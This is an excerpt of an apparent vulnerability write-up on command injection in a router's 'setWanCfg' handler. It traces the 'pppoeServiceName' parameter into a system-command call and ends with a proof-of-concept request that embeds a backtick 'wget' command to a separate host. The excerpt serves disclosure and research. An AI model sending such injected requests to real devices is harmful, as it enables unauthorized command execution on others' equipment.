...
In sub_42BA0C function, it reads in a user-provided parameter `pppoeServiceName` and passes its value to Uci_Set_Str_By_Idx function,which is defined in libcscommon.so.

<div  align="center"><img src="./img/lib.png" style="zoom:80%;" /></div>

As we can see ,the parameter `v3` is  passed to  Uci_Set_Str  function.  

Then the value of the `pppoeServiceName`  is  inserted into `v11`  using `snprintf`,and the value of v11 will be handled by the function CsteSystem.
...
We set `pppoeServiceName` as **\`wget 192.168.6.1:7777/testpoc\`** , and the router will execute it,such as:
...
{"topicurl":"setWanCfg","pppoeServiceName":"`wget 192.168.6.1:7777/testpoc`"
}
```
